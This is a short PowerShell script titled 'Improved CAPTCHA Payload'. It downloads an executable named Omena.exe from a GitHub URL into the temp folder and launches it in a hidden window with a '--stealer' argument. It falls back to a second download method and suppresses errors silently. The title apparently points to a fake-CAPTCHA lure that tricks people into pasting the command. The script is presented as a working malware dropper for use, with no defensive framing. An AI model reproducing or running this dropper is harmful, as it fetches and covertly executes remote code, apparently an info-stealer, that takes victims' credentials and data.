# Improved CAPTCHA Payload
try {
    $exePath = "$env:TEMP\Omena.exe"
    $url = "https://raw.githubusercontent.com/urho122-cpu/captcha/refs/heads/main/Omena.exe"
    
    Write-Host "Downloading..." -ForegroundColor Green
    
    $wc = New-Object Net.WebClient
    $wc.DownloadFile($url, $exePath)
    
    Write-Host "Download complete. Running..." -ForegroundColor Green
    
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    # Try alternative method
    try {
        Invoke-WebRequest -Uri $url -OutFile $exePath
        Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
    } catch {
        # Silent fail
    }
}
